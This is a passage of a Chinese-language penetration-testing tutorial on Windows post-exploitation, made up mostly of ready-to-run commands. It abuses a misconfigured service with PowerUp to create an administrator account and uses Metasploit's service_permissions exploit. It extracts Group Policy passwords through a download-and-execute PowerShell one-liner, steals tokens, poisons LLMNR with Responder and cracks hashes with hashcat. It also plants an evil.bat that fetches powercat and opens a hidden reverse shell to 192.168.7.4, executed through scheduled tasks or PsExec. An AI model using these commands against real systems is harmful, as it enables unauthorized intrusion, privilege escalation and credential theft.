<pre class="language-bash" data-language="bash"><code class="language-bash">systeminfo <span class="token operator">></span> info.txt</code></pre>
<p>直接使用 wesng 即可</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">python wes.py info.txt</code></pre>
<p>使用 wesng 可以直接看到目标主机可能存在的 CVE 漏洞，从而便于我们有针对性的利用这些漏洞</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/nathan8/article/details/108804056">https://blog.csdn.net/nathan8/article/details/108804056</a></p>
<p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1043370">https://cloud.tencent.com/developer/article/1043370</a></p>
<h2 id="0x15-系统服务权限配置不当利用"><a href="#0x15-系统服务权限配置不当利用" class="headerlink" title="0x15 系统服务权限配置不当利用"></a>0x15 系统服务权限配置不当利用</h2><h3 id="PowerUp"><a href="#PowerUp" class="headerlink" title="PowerUp"></a>PowerUp</h3><p>PowerUp 可以用来寻找目标中权限配置不当的服务，下载地址：<a target="_blank" rel="noopener" href="https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerUp/PowerUp.ps1">https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerUp/PowerUp.ps1</a></p>
<p>在 PowerShell 中导入并执行脚本</p>
<pre class="language-powershell" data-language="powershell"><code class="language-powershell"><span class="token function">Import-Module</span> <span class="token punctuation">.</span>\PowerUp<span class="token punctuation">.</span>ps1
<span class="token function">Invoke-AllChecks</span></code></pre>
<p>如果 PowerShell 由于处在受限模式以至于无法导入脚本，可以使用以下命令绕过</p>
<pre class="language-powershell" data-language="powershell"><code class="language-powershell"><span class="token function">PS</span> C:\Users\admin\Desktop> powershell<span class="token punctuation">.</span>exe <span class="token operator">-</span>exec bypass <span class="token operator">-</span>command <span class="token string">"&amp;&#123;Import-Module .\PowerUp.ps1;Invoke-AllChecks&#125;"</span>

<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Running <span class="token function">Invoke-AllChecks</span>

<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Checking <span class="token keyword">if</span> user is in a local <span class="token function">group</span> with administrative privileges<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> User is in a local <span class="token function">group</span> that grants administrative privileges<span class="token operator">!</span>
<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> Run a BypassUAC attack to elevate privileges to admin<span class="token punctuation">.</span>

<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Checking <span class="token keyword">for</span> unquoted service paths<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>

<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Checking service executable and argument permissions<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>

ServiceName    : MongoDB
Path           : C:\Web\mongodb\bin\mongod<span class="token punctuation">.</span>exe <span class="token operator">--</span>auth <span class="token operator">--</span>config C:\Web\mongodb\mongod<span class="token punctuation">.</span>conf <span class="token operator">--</span>s
                 ervice
ModifiableFile : C:\Web\mongodb\mongod<span class="token punctuation">.</span>conf
StartName      : LocalSystem
AbuseFunction  : <span class="token function">Install-ServiceBinary</span> <span class="token operator">-</span>ServiceName <span class="token string">'MongoDB'</span></code></pre>
<p>由于结果可能比较长，因此也可以将其保存到 txt 文件里，方便查看</p>
<pre class="language-powershell" data-language="powershell"><code class="language-powershell">powershell<span class="token punctuation">.</span>exe <span class="token operator">-</span>exec bypass <span class="token operator">-</span>command <span class="token string">"&amp;&#123;Import-Module .\PowerUp.ps1;Invoke-AllChecks | Out-File -Encoding ASCII result.txt&#125;"</span></code></pre>
<p>从检查的结果可以看出 MongoDB 服务存在漏洞，利用 Install-ServiceBinary 模块，通过 PowerUp 利用该处权限配置不当添加管理员用户</p>
<pre class="language-powershell" data-language="powershell"><code class="language-powershell"><span class="token function">PS</span> C:\Users\admin\Desktop> powershell<span class="token punctuation">.</span>exe <span class="token operator">-</span>exec bypass <span class="token operator">-</span>command <span class="token string">"&amp;&#123;Import-Module .\PowerUp.ps1;Install-ServiceBinary -ServiceName 'MongoDB' -UserName test -Password Passw0rd&#125;"</span>

ServiceName                   ServicePath                   Command                       BackupPath
<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>                   <span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>                   <span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">-</span>                       <span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">-</span>
MongoDB                       C:\Web\mongodb\bin\mongod<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>  net user test Passw0rd <span class="token operator">/</span>ad<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> C:\Web\mongodb\bin\mongod<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span></code></pre>
<p>重启系统，查看用户，发现 test 已经被添加到管理员组了</p>
<pre class="language-powershell" data-language="powershell"><code class="language-powershell"><span class="token function">PS</span> C:\Users\admin\Desktop> net user test
用户名                 test
全名
……
本地组成员             <span class="token operator">*</span>Administrators       <span class="token operator">*</span>Users
全局组成员             <span class="token operator">*</span>None
命令成功完成。</code></pre>
<h3 id="Metasploit-1"><a href="#Metasploit-1" class="headerlink" title="Metasploit"></a>Metasploit</h3><p>在 MSF 中，先看下已上线主机的权限</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">meterpreter <span class="token operator">></span> getuid
Server username: admin<span class="token punctuation">\</span>dev</code></pre>
<p>MSF 中对应服务权限配置不当的利用模块是 <code>exploit/windows/local/service_permissions</code></p>
<p>利用步骤如下：</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">use exploit/windows/local/service_permissions
<span class="token builtin class-name">set</span> payload windows/meterpreter/reverse_tcp
<span class="token builtin class-name">set</span> lhost <span class="token number">192.168</span>.7.1
<span class="token builtin class-name">set</span> lport <span class="token number">4444</span>
<span class="token builtin class-name">set</span> session <span class="token number">1</span>
run</code></pre>
<p><a target="_blank" rel="noopener" href="https://evi1cg.me/archives/Powerup.html">https://evi1cg.me/archives/Powerup.html</a></p>
<h2 id="0x16-组策略凭据获取"><a href="#0x16-组策略凭据获取" class="headerlink" title="0x16 组策略凭据获取"></a>0x16 组策略凭据获取</h2><h3 id="0、前言-1"><a href="#0、前言-1" class="headerlink" title="0、前言"></a>0、前言</h3><p>SYSVOL 是活动目录里的一个用于存储域公共文件服务器副本的共享文件夹，在域中的所有域控之间进行复制，SYSVOL 在所有经过身份验证的域用户或者域信任用户具有读权限的活动目录域范围内共享，所有的域策略均存放在 C:\Windows\SYSVOL\DOMAIN\Policies\ 目录中</p>
<p>管理员在域中新建一个组策略后，系统会自动在 SYSVOL 目录中生成一个 XML 文件</p>
<p>该文件中保存了该组策略更新后的密码，该密码使用 AES-256 算法，但 2012 年微软公布了该密码的私钥，也就是说任何人都可以对其进行解密</p>
<h3 id="1、查找包含-cpassword-的-XML-文件"><a href="#1、查找包含-cpassword-的-XML-文件" class="headerlink" title="1、查找包含 cpassword 的 XML 文件"></a>1、查找包含 cpassword 的 XML 文件</h3><p>浏览 SYSVOL 文件夹，手动查找包含 cpassword 的 XML 文件</p>
<p>或者使用 findstr 自动搜索包含 cpassword 的 XML 文件</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">findstr /s /i <span class="token string">"cpassword"</span> C:<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>SYSVOL<span class="token punctuation">\</span>*.xml</code></pre>
<h3 id="2、解密-cpassword-密文"><a href="#2、解密-cpassword-密文" class="headerlink" title="2、解密 cpassword 密文"></a>2、解密 cpassword 密文</h3><h4 id="python-脚本"><a href="#python-脚本" class="headerlink" title="python 脚本"></a>python 脚本</h4><p>Gpprefdecrypt.py 下载地址：<a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/leonteale/pentestpackage/master/Gpprefdecrypt.py">https://raw.githubusercontent.com/leonteale/pentestpackage/master/Gpprefdecrypt.py</a></p>
<pre class="language-bash" data-language="bash"><code class="language-bash">python2.7 Gpprefdecrypt.py Wdkeu1drbxqPJm7YAtPtwBtyzcqO88hJUBDD2eseoY0</code></pre>
<h4 id="PowerShell-脚本"><a href="#PowerShell-脚本" class="headerlink" title="PowerShell 脚本"></a>PowerShell 脚本</h4><p>PowerSploit 项目中提供了 Get-GPPPassword.ps1 脚本。</p>
<p>脚本下载地址：<a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Get-GPPPassword.ps1">https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Get-GPPPassword.ps1</a></p>
<p>直接远程下载脚本执行：</p>
<pre class="language-powershell" data-language="powershell"><code class="language-powershell">PowerShell<span class="token punctuation">.</span>exe <span class="token operator">-</span>Exec Bypass <span class="token operator">-</span>C <span class="token string">"IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Get-GPPPassword.ps1');Get-GPPPassword"</span>

如果无法下载可以使用 github 代理
PowerShell<span class="token punctuation">.</span>exe <span class="token operator">-</span>Exec Bypass <span class="token operator">-</span>C <span class="token string">"IEX(New-Object Net.WebClient).DownloadString('https://ghproxy.com/https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Get-GPPPassword.ps1');Get-GPPPassword"</span></code></pre>
<p>或者下载到本地，执行也行</p>
<pre class="language-powershell" data-language="powershell"><code class="language-powershell"><span class="token function">Import-Module</span> <span class="token punctuation">.</span>\<span class="token function">Get-GPPPassword</span><span class="token punctuation">.</span>ps1
<span class="token function">Get-GPPPassword</span></code></pre>
<p>如果 PowerShell 由于处在受限模式以至于无法导入脚本，可以使用以下命令绕过</p>
<pre class="language-powershell" data-language="powershell"><code class="language-powershell">powershell<span class="token punctuation">.</span>exe <span class="token operator">-</span>exec bypass <span class="token operator">-</span>command <span class="token string">"&amp;&#123;Import-Module .\Get-GPPPassword.ps1;Get-GPPPassword&#125;"</span></code></pre>
<h4 id="MSF"><a href="#MSF" class="headerlink" title="MSF"></a>MSF</h4><p>使用 post/windows/gather/credentials/gpp 模块也可以</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">use post/windows/gather/credentials/gpp
<span class="token builtin class-name">set</span> session <span class="token number">1</span>
run</code></pre>
<h2 id="0x17-令牌窃取"><a href="#0x17-令牌窃取" class="headerlink" title="0x17 令牌窃取"></a>0x17 令牌窃取</h2><h3 id="0、前言-2"><a href="#0、前言-2" class="headerlink" title="0、前言"></a>0、前言</h3><p>令牌（Token）是指系统中的临时秘钥，相当于账户和密码，有了令牌就可以在不知道密码的情况下访问目标相关资源了，这些令牌将持续存在于系统中，除非系统重新启动</p>
<h3 id="1、MSF"><a href="#1、MSF" class="headerlink" title="1、MSF"></a>1、MSF</h3><p>在获取到 Meterpreter Shell 后，使用以下命令获取令牌</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">load incognito
list_tokens -u</code></pre>
<p>有两种令牌，一个是 Delegation Tokens 即授权令牌，还有一种是 Impersonation Tokens 即模拟令牌。前者支持交互式登录比如远程桌面，后者支持非交互的会话</p>
<p>令牌获取的数量取决于获取到 Shell 的权限等级</p>
<p>如果已经获取到了 SYSTEM 权限的令牌，那么攻击者就可以伪造这个令牌，拥有对应的权限</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">impersonate_token <span class="token string">"NT AUTHORITY\SYSTEM"</span>
如果不加双引号，<span class="token punctuation">\</span> 需要改成 <span class="token punctuation">\</span><span class="token punctuation">\</span> 才行</code></pre>
<h3 id="2、Rotten-Potato-本地提权"><a href="#2、Rotten-Potato-本地提权" class="headerlink" title="2、Rotten Potato 本地提权"></a>2、Rotten Potato 本地提权</h3><p>Rotten Potato 直译过来就烂土豆的意思，如果目标中存在有效的令牌，就可以通过 Rotten Potato 模拟用户令牌实现提权。</p>
<p>Rotten Potato 项目地址：<a target="_blank" rel="noopener" href="https://github.com/breenmachine/RottenPotatoNG">https://github.com/breenmachine/RottenPotatoNG</a></p>
<p>运行 RottenPotato.exe 直接弹出 SYSTEM 权限的 CMD 窗口，不需要用到 MSF</p>
<h2 id="0x18-LLMNR-和-NetBIOS-欺骗攻击"><a href="#0x18-LLMNR-和-NetBIOS-欺骗攻击" class="headerlink" title="0x18 LLMNR 和 NetBIOS 欺骗攻击"></a>0x18 LLMNR 和 NetBIOS 欺骗攻击</h2><h3 id="0、前言-3"><a href="#0、前言-3" class="headerlink" title="0、前言"></a>0、前言</h3><p>如果已经进入目标网络，但是没有获得凭证，可以使用 LLMNR 和 NetBIOS 欺骗攻击对目标进行无凭证条件下的权限获取</p>
<h3 id="1、基本概念"><a href="#1、基本概念" class="headerlink" title="1、基本概念"></a>1、基本概念</h3><h4 id="LLMNR"><a href="#LLMNR" class="headerlink" title="LLMNR"></a>LLMNR</h4><p>本地链路多播名称解析（LLMNR）是一种域名系统数据包格式，当局域网中的 DNS 服务器不可用时，DNS 客户端就会使用 LLMNR 解析本地网段中机器的名称，直到 DNS 服务器恢复正常为止</p>
<p>从 Windows Vista 开始支持 LLMNR ，Linux 系统也通过 systemd 实现了此协议，同时 LLMNR 也支持 IPv6</p>
<h4 id="NetBIOS"><a href="#NetBIOS" class="headerlink" title="NetBIOS"></a>NetBIOS</h4><p>NetBIOS 协议是由 IBM 公司开发，主要用于数十台计算机的小型局域网，根据 NetBIOS 协议广播获得计算机名称，并将其解析成相应的 IP 地址</p>
<p>从 Windows NT 以后版本的所有操作系统中都可以使用 NetBIOS，不过 NetBIOS 不支持 IPv6</p>
<p>NetBIOS 提供的三种服务：</p>
<p> i、NetBIOS-NS（名称服务）：主要用于名称注册和解析，以启动会话和分发数据报，该服务默认监听 UDP 137 端口，也可以使用 TCP 的 137 端口进行监听</p>
<p> ii、Datagram Distribution Service（数据报分发服务）：无连接服务，该服务负责进行错误检测和恢复，默认监听 UDP 138 端口</p>
<p> iii、Session Service（会话服务）：允许两台计算机建立连接，默认使用 TCP 139 端口</p>
<h4 id="Net-NTLM-Hash"><a href="#Net-NTLM-Hash" class="headerlink" title="Net-NTLM Hash"></a>Net-NTLM Hash</h4><p>NTLM 即 NT LAN Manager，NTLM 是指 telnet 的一种验证身份方式，即问询/应答协议，是 Windows NT 早期版本的标准安全协议</p>
<p>Net-NTLM Hash 不同于 NTLM Hash，NTLM Hash 是 Windows 登录密码的 Hash 值，可以在 Windows 系统的 SAM 文件或者域控的 NTDS.dit 文件中提取出来，NTLM Hash 支持哈希传递攻击</p>
<p>Net-NTLM Hash 是网络环境下 NTLM 认证的 Hash，使用 Responder 抓取的通常就是 Net-NTLM Hash，该 Hash 不能进行哈希传递，但可用于 NTLM 中继攻击或者使用 Hashcat 等工具碰撞出明文进行横向</p>
<h3 id="2、利用"><a href="#2、利用" class="headerlink" title="2、利用"></a>2、利用</h3><p>Responder 是一款使用 Python 编写用于毒化 LLMNR 和 NBT-NS 请求的一款工具</p>
<p>假设我们已连接到 Windows Active Directory 环境，当网络上的设备尝试用 LLMNR 和 NBT-NS（NetBIOS 名称服务）请求来解析目标机器时，Responder 就会伪装成目标机器</p>
<p>当受害者机器尝试登陆攻击者机器，Responder 就可以获取受害者机器用户的 Net-NTLM 哈希值</p>
<p>Responder 项目地址：<a target="_blank" rel="noopener" href="https://github.com/lgandx/Responder">https://github.com/lgandx/Responder</a></p>
<p>Responder 不支持 Windows，这里使用 Kali 进行演示</p>
<p>Responder 开启监听，-I 指定网卡，这里 eth1 的 IP 为 192.168.7.65</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">python Responder.py -I eth1</code></pre>
<p>开启监听后，当目标主机上有人访问 Responder 主机的共享目录时，就会看到对方的 Net-NTLM 哈希值了</p>
<p>再利用 Hashcat 进行碰撞</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">hashcat -m <span class="token number">5600</span> hash.txt password.txt -D <span class="token number">1</span></code></pre>
<p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/a210528f9b35">https://www.jianshu.com/p/a210528f9b35</a></p>
<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/system/194549.html">https://www.freebuf.com/articles/system/194549.html</a></p>
<h2 id="0x19-IPC-与计划任务"><a href="#0x19-IPC-与计划任务" class="headerlink" title="0x19 IPC 与计划任务"></a>0x19 IPC 与计划任务</h2><h3 id="0、前言-4"><a href="#0、前言-4" class="headerlink" title="0、前言"></a>0、前言</h3><p>在多层代理的环境中，由于网络限制，通常采用命令行的方式连接主机，这里学习下 IPC 建立会话与配置计划任务的相关点</p>
<h3 id="1、IPC"><a href="#1、IPC" class="headerlink" title="1、IPC"></a>1、IPC</h3><p>IPC (Internet Process Connection) 是为了实现进程间通信而开放的命名管道，当目标开启了 IPC$ 文件共享并得到用户账号密码后，就可以使用 IPC 建立连接，获取权限</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">建立 IPC 连接
C:<span class="token punctuation">\</span><span class="token operator">></span>net use <span class="token punctuation">\</span><span class="token punctuation">\</span><span class="token number">192.168</span>.7.107<span class="token punctuation">\</span>ipc$ <span class="token string">"1qaz@WSX"</span> /user:administrator
命令成功完成。


输入 net use 可以查看当前建立的连接
C:<span class="token punctuation">\</span><span class="token operator">></span>net use
会记录新的网络连接。

状态       本地        远程                      网络
-------------------------------------------------------------------------------
OK                     <span class="token punctuation">\</span><span class="token punctuation">\</span><span class="token number">192.168</span>.7.107<span class="token punctuation">\</span>ipc$      Microsoft Windows Network
命令成功完成。</code></pre>
<p>映射C盘到本地</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">net use t: <span class="token punctuation">\</span><span class="token punctuation">\</span><span class="token number">192.168</span>.7.107<span class="token punctuation">\</span>c$</code></pre>
<p>渗透完成后需要清理痕迹，这里就会用到一条删除ipc连接的命令</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">net use <span class="token punctuation">\</span><span class="token punctuation">\</span><span class="token number">192.168</span>.1.136<span class="token punctuation">\</span>ipc$ /del   <span class="token comment">#删除ipc$</span>
net use t: /del						<span class="token comment">#删除映射</span></code></pre>
<p>dir 列出对方目录</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">C:<span class="token punctuation">\</span><span class="token operator">></span>dir <span class="token punctuation">\</span><span class="token punctuation">\</span><span class="token number">192.168</span>.7.107<span class="token punctuation">\</span>c$
 驱动器 <span class="token punctuation">\</span><span class="token punctuation">\</span><span class="token number">192.168</span>.7.107<span class="token punctuation">\</span>c$ 中的卷没有标签。
 卷的序列号是 BC2F-8F01

 <span class="token punctuation">\</span><span class="token punctuation">\</span><span class="token number">192.168</span>.7.107<span class="token punctuation">\</span>c$ 的目录

<span class="token number">2020</span>/11/24  <span class="token number">17</span>:28    <span class="token operator">&lt;</span>DIR<span class="token operator">></span>          Program Files
<span class="token number">2020</span>/11/24  <span class="token number">17</span>:26    <span class="token operator">&lt;</span>DIR<span class="token operator">></span>          Program Files <span class="token punctuation">(</span>x86<span class="token punctuation">)</span>
<span class="token number">2021</span>/02/13  <span class="token number">17</span>:49    <span class="token operator">&lt;</span>DIR<span class="token operator">></span>          TEMP
<span class="token number">2021</span>/08/02  <span class="token number">11</span>:42    <span class="token operator">&lt;</span>DIR<span class="token operator">></span>          Users
<span class="token number">2020</span>/11/25  08:37    <span class="token operator">&lt;</span>DIR<span class="token operator">></span>          Windows
               <span class="token number">0</span> 个文件              <span class="token number">0</span> 字节
              <span class="token number">5</span> 个目录 <span class="token number">32,833</span>,009,664 可用字节</code></pre>
<p>tasklist 查看进程</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">C:<span class="token punctuation">\</span><span class="token operator">></span>tasklist /S <span class="token number">192.168</span>.7.107 /U administrator /P 1qaz@WSX</code></pre>
<h3 id="2、计划任务"><a href="#2、计划任务" class="headerlink" title="2、计划任务"></a>2、计划任务</h3><p>Windows 可用于创建计划任务的命令有两个，分别是 at 和 schtasks，at 在 Windows Server 2008 及之后的系统中，已经被废弃了</p>
<p>在建立 IPC 连接后，使用计划任务运行可执行文件，主要步骤如下：</p>
<p>1、查看目标主机时间</p>
<p>2、上传可执行文件到目标主机</p>
<p>3、设置计划任务执行可执行文件</p>
<p>4、删除计划任务</p>
<p>首先查看下目标主机时间</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">C:<span class="token punctuation">\</span><span class="token operator">></span>net <span class="token function">time</span> <span class="token punctuation">\</span><span class="token punctuation">\</span><span class="token number">192.168</span>.7.107
<span class="token punctuation">\</span><span class="token punctuation">\</span><span class="token number">192.168</span>.7.107 的当前时间是 <span class="token number">2021</span>/8/2 <span class="token number">14</span>:28:01
命令成功完成。</code></pre>
<p>创建一个反弹木马 bat 程序 evil.bat，这里使用 PowerShell 进行反弹，bat 文件内容如下：</p>
<pre class="language-powershell" data-language="powershell"><code class="language-powershell">powershell<span class="token punctuation">.</span>exe <span class="token operator">-</span>nop <span class="token operator">-</span>w hidden <span class="token operator">-</span>exec bypass <span class="token operator">-</span>c <span class="token string">"IEX (New-Object System.Net.Webclient).DownloadString('https://ghproxy.com/raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1');powercat -c 192.168.7.4 -p 4444 -e cmd"</span></code></pre>
<p>在攻击机上开启 nc 监听</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">nc</span> -lvp <span class="token number">4444</span></code></pre>
<p>将 bat 程序上传到目标主机</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">copy evil.bat <span class="token punctuation">\</span><span class="token punctuation">\</span><span class="token number">192.168</span>.7.107<span class="token punctuation">\</span>c$</code></pre>
<p>使用 at 创建计划任务</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">at <span class="token punctuation">\</span><span class="token punctuation">\</span><span class="token number">192.168</span>.7.107 <span class="token number">14</span>:30 C:<span class="token punctuation">\</span>evil.bat</code></pre>
<p>如果想清除 ID 为 1 的计划任务</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">at <span class="token punctuation">\</span><span class="token punctuation">\</span><span class="token number">192.168</span>.7.107 <span class="token number">1</span> /del</code></pre>
<p>使用 schtasks 创建计划任务</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 开机以 system 权限执行 C:\evil.bat</span>
schtasks /create /s <span class="token number">192.168</span>.7.107 /tn evil /sc onstart /tr C:<span class="token punctuation">\</span>evil.bat /ru system /f

<span class="token comment"># 在 2021/08/03 前的每一天的 14:30:00 执行 C:\evil.bat</span>
schtasks /create /s <span class="token number">192.168</span>.7.107 /tn evil /tr C:<span class="token punctuation">\</span>evil.bat /sc daily /st <span class="token number">14</span>:30:00 /ed <span class="token number">2021</span>/08/03

<span class="token comment"># 立刻运行名称为 evil 的任务</span>
schtasks /run /s <span class="token number">192.168</span>.7.107 /i /tn <span class="token string">"evil"</span></code></pre>
<p>如果想清除名称为 evil 的计划任务</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">schtasks /delete /s <span class="token number">192.168</span>.7.107 /tn <span class="token string">"evil"</span> /f</code></pre>
<p>在建立 IPC 连接后，除了使用计划任务进行间接的反弹 Shell，还可以通过 PsExec 直接反弹 Shell</p>
<p>PsExec 下载地址：<a target="_blank" rel="noopener" href="https://download.sysinternals.com/files/PSTools.zip">https://download.sysinternals.com/files/PSTools.zip</a></p>
<pre class="language-bash" data-language="bash"><code class="language-bash">Psexec.exe -accepteula <span class="token punctuation">\</span><span class="token punctuation">\</span><span class="token number">192.168</span>.7.107 -s cmd.exe</code></pre>
<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/251389.html">https://www.freebuf.com/articles/web/251389.html</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_44881113/article/details/120280735">https://blog.csdn.net/qq_44881113/article/details/120280735</a></p>
<h2 id="0x20-Hashcat-的使用"><a href="#0x20-Hashcat-的使用" class="headerlink" title="0x20 Hashcat 的使用"></a>0x20 Hashcat 的使用</h2><h3 id="1、介绍-2"><a href="#1、介绍-2" class="headerlink" title="1、介绍"></a>1、介绍</h3><p>Hashcat 是一款用于破解密码的工具，据说是世界上最快最高级的密码破解工具，支持 LM 哈希、MD5、SHA 等系列的密码破解，同时也支持 Linux、Mac、Windows 平台</p>
<p>工具地址：<a target="_blank" rel="noopener" href="https://hashcat.net">https://hashcat.net</a></p>
<p>项目地址：<a target="_blank" rel="noopener" href="https://github.com/hashcat/hashcat">https://github.com/hashcat/hashcat</a></p>
<h3 id="2、安装-1"><a href="#2、安装-1" class="headerlink" title="2、安装"></a>2、安装</h3><h4 id="Mac"><a href="#Mac" class="headerlink" title="Mac"></a>Mac</h4><p>Mac 用户直接使用 brew 安装即可</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">brew <span class="token function">install</span> hashcat</code></pre>
<h4 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h4><p>对于 Debain 的 Linux，比如 Kali、Ubuntu 可以直接使用 apt 进行安装</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">apt</span> <span class="token function">install</span> hashcat</code></pre>
<p>或者下载官方二进制文件进行安装</p>
<p>在 <a target="_blank" rel="noopener" href="https://github.com/hashcat/hashcat/releases">https://github.com/hashcat/hashcat/releases</a> 里下载最新版压缩包，这里以 6.2.4 版为例</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">tar</span> zxvf hashcat-6.2.4.7z
<span class="token builtin class-name">cd</span> hashcat-6.2.4
<span class="token function">chmod</span> +x hashcat.bin
./hashcat.bin</code></pre>
<h4 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h4><p>在 <a target="_blank" rel="noopener" href="https://github.com/hashcat/hashcat/releases">https://github.com/hashcat/hashcat/releases</a> 里下载最新版压缩包，解压后可以看到 hashcat.exe</p>
<h3 id="3、使用-1"><a href="#3、使用-1" class="headerlink" title="3、使用"></a>3、使用</h3><p>常用参数：</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">-r  使用自定义破解规则
-o  指定破解成功后的 <span class="token builtin class-name">hash</span> 及所对应的明文密码的存放位置
-m  指定要破解的 <span class="token builtin class-name">hash</span> 类型，如果不指定类型，则默认是 MD5
-a  指定要使用的破解模式，其值参考后面对参数。“-a <span class="token number">0</span>” 字典攻击，“-a <span class="token number">1</span>” 组合攻击；“-a <span class="token number">3</span>” 掩码攻击
-D  指定 opencl 的设备类型
--show      显示已经破解的 <span class="token builtin class-name">hash</span> 及该 <span class="token builtin class-name">hash</span> 所对应的明文
--force     忽略破解过程中的警告信息,跑单条 <span class="token builtin class-name">hash</span> 可能需要加上此选项
--remove    删除已被破解成功的 <span class="token builtin class-name">hash</span>
--username      忽略 <span class="token builtin class-name">hash</span> 文件中的指定的用户名,在破解 linux 系统用户密码 <span class="token builtin class-name">hash</span> 可能会用到
--increment     启用增量破解模式,你可以利用此模式让 hashcat 在指定的密码长度范围内执行破解过程
--increment-min         密码最小长度,后面直接等于一个整数即可,配置 increment 模式一起使用
--increment-max         密码最大长度,同上
--outfile-format        指定破解结果的输出格式 <span class="token function">id</span> ,默认是 <span class="token number">3</span>
--self-test-disable 关闭启动自检</code></pre>
<p>-a 破解模式</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token number">0</span> <span class="token operator">|</span> Straight        （字段破解）
<span class="token number">1</span> <span class="token operator">|</span> Combination （组合破解）
<span class="token number">3</span> <span class="token operator">|</span> Brute-force （掩码暴力破解）
<span class="token number">6</span> <span class="token operator">|</span> Hybrid Wordlist + Mask（字典+掩码破解）
<span class="token number">7</span> <span class="token operator">|</span> Hybrid Mask + Wordlist（掩码+字典破解）</code></pre>
<p>-D 指定设备类型</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token number">1</span> <span class="token operator">|</span> CPU
<span class="token number">2</span> <span class="token operator">|</span> GPU
<span class="token number">3</span> <span class="token operator">|</span> FPGA, DSP, Co-Processor</code></pre>
<p>一般使用 -D 2 指定 GPU 破解</p>
<p>掩码设置：</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">l <span class="token operator">|</span> abcdefghijklmnopqrstuvwxyz              纯小写字母
u <span class="token operator">|</span> ABCDEFGHIJKLMNOPQRSTUVWXYZ              纯大写字母
d <span class="token operator">|</span> 0123456789                                              纯数字
h <span class="token operator">|</span> 0123456789abcdef                                    十六进制小写字母和数字
H <span class="token operator">|</span> 0123456789ABCDEF                                    十六进制大写字母和数字
s <span class="token operator">|</span>  <span class="token operator">!</span>"#$%<span class="token operator">&amp;</span>'<span class="token punctuation">(</span><span class="token punctuation">)</span>*+,-./:<span class="token punctuation">;</span><span class="token operator">&lt;=</span><span class="token operator">></span>?@<span class="token punctuation">[</span><span class="token punctuation">\</span><span class="token punctuation">]</span>^_`<span class="token punctuation">&#123;</span><span class="token operator">|</span><span class="token punctuation">&#125;</span>~   特殊字符
a <span class="token operator">|</span> ?l?u?d?s                                                    键盘上所有可见的字符
b <span class="token operator">|</span> 0x00 - 0xff                                             匹配密码空格</code></pre>
<p>掩码设置举例：</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">八位数字密码：?d?d?d?d?d?d?d?d
八位未知密码：?a?a?a?a?a?a?a?a
前四位为大写字母，后面四位为数字：?u?u?u?u?d?d?d?d
前四位为数字或者是小写字母，后四位为大写字母或者数字：?h?h?h?h?H?H?H?H
前三个字符未知，中间为admin，后三位未知：?a?a?aadmin?a?a?a
